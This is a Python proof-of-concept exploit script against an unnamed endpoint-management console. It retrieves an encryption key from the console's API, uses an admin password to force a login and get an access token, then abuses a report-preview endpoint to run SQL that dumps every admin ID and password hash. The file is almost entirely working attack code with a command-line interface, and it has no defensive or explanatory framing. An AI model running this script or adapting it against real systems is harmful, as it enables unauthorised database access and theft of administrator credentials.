from requests import get, post
import warnings
from json import loads, dumps
import base64
import argparse
import js2py
from CryptoJS import CryptoJS

warnings.filterwarnings("ignore")

username = ''
password = ''
URL = ''

def get_key():
    data_url = URL + "/api/console/ems/conceal"
    data_cookies = {"lang_set": "en"}
    data_headers = {
        "Sec-Ch-Ua": "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"",
        "Accept": "application/json;charset=utf-8",
        "Content-Type": "application/json;charset=UTF-8",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Origin": "https://192.168.100.199:8803",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://192.168.100.199:8803/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8,vi;q=0.7",
        "Connection": "close"
    }
    data_json = {
        "request": {"action": "get_conceal_key", "data": [], "params": ["YzNiODY4MzM0MTdiZGI4ZmUxNjQ3MGM3OGMwNDNlNTg="], "revision": "1"}
    }

    res = post(data_url, headers=data_headers, cookies=data_cookies, json=data_json, verify=False)
    res = loads(res.text)
    return res['response'][0]['conceal_key']

def login(username, enc_pass):
    data_url = URL + "/api/console/ems/admin/force_login"
    data_cookies = {"lang_set": "en"}
    data_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
        "Accept": "application/json;charset=utf-8",
        "Accept-Language": "en,vi-VN;q=0.8,en-US;q=0.5,vi;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Authorization": "",
        "Content-Type": "application/json;charset=utf-8",
        "Origin": "https://192.168.100.188:8803",
        "Referer": "https://192.168.100.188:8803/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers",
        "Connection": "close"
    }
    data_json = {
        "request": {"action": "console_login", "data": {"extract_key": "YzNiODY4MzM0MTdiZGI4ZmUxNjQ3MGM3OGMwNDNlNTg="}, "params": [username, enc_pass, "en", "SAME_ID"], "revision": "1"}
    }

    res = post(data_url, headers=data_headers, cookies=data_cookies, json=data_json, verify=False)
    res = loads(res.text)
    if res['error_code'] == 'SWO-00012':
        print("[-] Error: There are already logged-in users")
        exit()
    return res['response'][0]['access_token']

def encryptAES(key, data1):
    encKey = CryptoJS.enc.Base64.parse(key)
    iv = CryptoJS.enc.Base64.parse("<react base64>")
    encrypted = CryptoJS.AES.encrypt(data1, encKey, {"mode": CryptoJS.mode.CBC, "padding": CryptoJS.pad.Pkcs7, "iv": iv})
    return encrypted.toString()

def sqli(token):
    print("Step 3: Exploiting SQLi\nListing user and hash ...")

    query = "select admin_id, password from tb_admin"
    data_url = URL + "/api/console/ems/query/report/preview"
    data_cookies = {"lang_set": "en"}
    data_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
        "Accept": "application/json;charset=utf-8",
        "Accept-Language": "en,vi-VN;q=0.8,en-US;q=0.5,vi;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Authorization": "bearer " + base64.b64encode(token.encode("ascii")).decode("ascii"),
        "Content-Type": "application/json;charset=utf-8",
        "Origin": URL,
        "Referer": URL,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers",
        "Connection": "close"
    }
    data_json = {
        "request": {"action": "preview_query_report", "data": [], "params": ["RDB", "1", query], "revision": "1"}
    }

    res = post(data_url, headers=data_headers, cookies=data_cookies, json=data_json, verify=False)
    res = loads(res.text)
    res = loads(res['response'][0]['report'])
    for r in res:
        print(r['admin_id'] + "\t" + r['password'])

def exp(username, password):
    print("Step 1: Getting conceal key ...")
    key = get_key()
    print("[+] Success! Conceal key is " + key)

    iv = "RVBQTWFuYWdlbWVudDEuMA=="
    enc_pass = encryptAES(key, password)
    print("Step 2: Logging in ...")
    token = login(username, enc_pass)
    print("[+] Success! Auth token: " + token)

    sqli(token)

parser = argparse.ArgumentParser(description='XXX Dump user hash using SQLi.\nExample: python .\poc.py -u admin -p password http://XXX-example.com', formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('url', type=str, help='URL of XXX server')
parser.add_argument('-u', '--username', type=str, required=True, help='username of XXX admin')
parser.add_argument('-p', '--password', type=str, required=True, help='password of XXX admin')
args = parser.parse_args()

URL = args.url
username = args.username
password = args.password

exp(username, password)
